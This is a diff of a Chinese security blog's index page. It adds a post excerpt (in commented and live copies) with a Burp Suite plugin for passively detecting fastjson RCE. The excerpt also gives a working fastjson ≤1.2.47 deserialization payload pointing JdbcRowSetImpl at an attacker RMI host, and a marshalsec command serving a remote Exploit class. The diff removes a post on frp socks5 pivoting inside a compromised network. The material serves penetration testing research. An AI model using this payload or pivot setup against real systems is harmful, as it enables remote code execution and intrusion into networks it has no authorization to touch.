@@ -117,6 +117,170 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2019/07/22/fastjson-rce.html" >fastjson被动扫描Burp插件</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-07-22  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>2019/08/13 Update.</p>
+<ol>
+<li>代码没有考虑到json里面套json的情况。</li>
+<li>代码没有考虑到在使用x-www-form-urlencoded的参数是json的情况。<br>这两个加上去之后感觉每个请求的时间都会增加，先挖坑。</li>
+</ol>
+<p>2019/08/02 Update:</p>
+<ol>
+<li>之前的代码太的太烂，去掉了不用的代码</li>
+<li>增加了hash验证，如果已经请求过的URL第二次就不检测了，需建立<code>/var/tmp/hash.txt</code>文件（自己看着改吧)</li>
+<li>如果不熟悉，就看官方文档，文档，文档。</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">main.py
+
+#&#x2F;usr&#x2F;bin&#x2F;env python
+#! -*- coding:utf-8 -*-
+
+from burp import IBurpExtender # 定义插件的基本信息类
+from burp import IHttpListener # http流量监听类
+from burp import IRequestInfo
+from noauth import noauth_request
+import hashlib
+
+class BurpExtender(IBurpExtender, IHttpListener):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks &#x3D; callbacks
+        self._helpers &#x3D; callbacks.getHelpers() # 通用函数
+        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)
+        print &quot;load fastjson_scan plugin success!&quot;
+        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
+        # register ourselves as an HTTP listener
+        callbacks.registerHttpListener(self)
+    
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:
+            if  messageIsRequest:
+                request &#x3D; messageInfo.getRequest()
+                analyzedRequest &#x3D; self._helpers.analyzeRequest(request)
+                contype &#x3D; analyzedRequest.getContentType()  #get Content-type, 这里看官方文档
+                url &#x3D; str(messageInfo.getUrl())
+                with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;) as f:
+                    lines &#x3D; f.read().splitlines()
+                m &#x3D; hashlib.md5()
+                m.update(url)
+                print url
+                if contype &#x3D;&#x3D; 4 and m.hexdigest() not in lines:    #是的，json的时候type等于4
+                    with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;,&#39;a+&#39;) as f:
+                        f.write(m.hexdigest()+&quot;\n&quot;)
+                    print &quot;[Info]Check url is: %s&quot; % url
+                    cur &#x3D; noauth_request(url)
+                    noauth_result &#x3D; cur.run()
+                    if noauth_result: 
+                        print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]
+                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
+                    print &quot;&quot;
+                else:
+                    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<p>fastjson在<code>1.2.47</code>以下，包括1.2.47存在反序列化导致的远程命令执行，payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:8000&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后在远程主机开启rmi服务和<code>Exploit.class</code>web服务就可以打了。</p>
+<pre class="line-numbers language-none"><code class="language-none">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:8888&#x2F;#Exploit 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2019/07/22/fastjson-rce.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>2019/08/13 Update.</p>
+<ol>
+<li>代码没有考虑到json里面套json的情况。</li>
+<li>代码没有考虑到在使用x-www-form-urlencoded的参数是json的情况。<br>这两个加上去之后感觉每个请求的时间都会增加，先挖坑。</li>
+</ol>
+<p>2019/08/02 Update:</p>
+<ol>
+<li>之前的代码太的太烂，去掉了不用的代码</li>
+<li>增加了hash验证，如果已经请求过的URL第二次就不检测了，需建立<code>/var/tmp/hash.txt</code>文件（自己看着改吧)</li>
+<li>如果不熟悉，就看官方文档，文档，文档。</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">main.py
+
+#&#x2F;usr&#x2F;bin&#x2F;env python
+#! -*- coding:utf-8 -*-
+
+from burp import IBurpExtender # 定义插件的基本信息类
+from burp import IHttpListener # http流量监听类
+from burp import IRequestInfo
+from noauth import noauth_request
+import hashlib
+
+class BurpExtender(IBurpExtender, IHttpListener):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks &#x3D; callbacks
+        self._helpers &#x3D; callbacks.getHelpers() # 通用函数
+        self._callbacks.setExtensionName(&quot;fastjson_scan&quot;)
+        print &quot;load fastjson_scan plugin success!&quot;
+        print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
+        # register ourselves as an HTTP listener
+        callbacks.registerHttpListener(self)
+    
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        if toolFlag &#x3D;&#x3D; 4 or toolFlag &#x3D;&#x3D; 64 or toolFlag &#x3D;&#x3D; 16 or toolFlag &#x3D;&#x3D; 32:
+            if  messageIsRequest:
+                request &#x3D; messageInfo.getRequest()
+                analyzedRequest &#x3D; self._helpers.analyzeRequest(request)
+                contype &#x3D; analyzedRequest.getContentType()  #get Content-type, 这里看官方文档
+                url &#x3D; str(messageInfo.getUrl())
+                with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;) as f:
+                    lines &#x3D; f.read().splitlines()
+                m &#x3D; hashlib.md5()
+                m.update(url)
+                print url
+                if contype &#x3D;&#x3D; 4 and m.hexdigest() not in lines:    #是的，json的时候type等于4
+                    with open(&#39;&#x2F;var&#x2F;tmp&#x2F;hash.txt&#39;,&#39;a+&#39;) as f:
+                        f.write(m.hexdigest()+&quot;\n&quot;)
+                    print &quot;[Info]Check url is: %s&quot; % url
+                    cur &#x3D; noauth_request(url)
+                    noauth_result &#x3D; cur.run()
+                    if noauth_result: 
+                        print &quot;[Critical] Found it is a Fastjson RCE %s&quot; % noauth_result[0]
+                    print &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;
+                    print &quot;&quot;
+                else:
+                    pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<p>fastjson在<code>1.2.47</code>以下，包括1.2.47存在反序列化导致的远程命令执行，payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:8000&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后在远程主机开启rmi服务和<code>Exploit.class</code>web服务就可以打了。</p>
+<pre class="line-numbers language-none"><code class="language-none">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:8888&#x2F;#Exploit 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2019/07/22/fastjson-rce.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2019/07/21/rsyslog-backdoor.html" >Rsyslog Backdoor</a>
 		</h3>
 		</div>
@@ -369,108 +533,6 @@ kill -9 $$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/05/08/frps.html" >frps的socks5代理</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-05-08  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p>
-<p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p>
-<p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p>
-<p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p>
-<pre class="line-numbers language-none"><code class="language-none">frps.ini: 
-
-[common]
-bind_port &#x3D; 10086
-privilege_token &#x3D; [passwd]
-max_pool_count &#x3D; 50
-dashboard_port &#x3D; [port]
-dashboard_user &#x3D; [user]
-dashboard_pwd &#x3D; [password]
-use_encryption &#x3D; true
-use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p>
-<pre class="line-numbers language-none"><code class="language-none">frpc.ini
-
-[common]
-server_addr &#x3D; [vps ip]
-server_port &#x3D; 10086
-privilege_token &#x3D; [passwd]
-max_pool_count &#x3D; 50
-
-
-[socks5]
-type &#x3D; tcp
-remote_port &#x3D; [port]
-plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>
-
-	
-
-	</div>
-  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p>
-<p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p>
-<p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p>
-<p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p>
-<pre class="line-numbers language-none"><code class="language-none">frps.ini: 
-
-[common]
-bind_port &#x3D; 10086
-privilege_token &#x3D; [passwd]
-max_pool_count &#x3D; 50
-dashboard_port &#x3D; [port]
-dashboard_user &#x3D; [user]
-dashboard_pwd &#x3D; [password]
-use_encryption &#x3D; true
-use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p>
-<pre class="line-numbers language-none"><code class="language-none">frpc.ini
-
-[common]
-server_addr &#x3D; [vps ip]
-server_port &#x3D; 10086
-privilege_token &#x3D; [passwd]
-max_pool_count &#x3D; 50
-
-
-[socks5]
-type &#x3D; tcp
-remote_port &#x3D; [port]
-plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>
-
-	
-	</div>
-  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -528,7 +590,7 @@ plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></s
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>52</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>53</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -549,6 +611,10 @@ plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></s
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/05/26/cobaltstrike-learn.html" ><i class="fa fa-file-o"></i>CobaltStrike通信学习笔记</a>
+      </li>
+    
+      <li>
         <a href="/2023/05/10/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
       </li>
     
@@ -562,10 +628,6 @@ plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></s
     
       <li>
         <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>记一次钓鱼演练和OS X下的渗透技巧</a>
-      </li>
-    
-      <li>
-        <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Github搜索小技巧</a>
       </li>
     
   </ul>
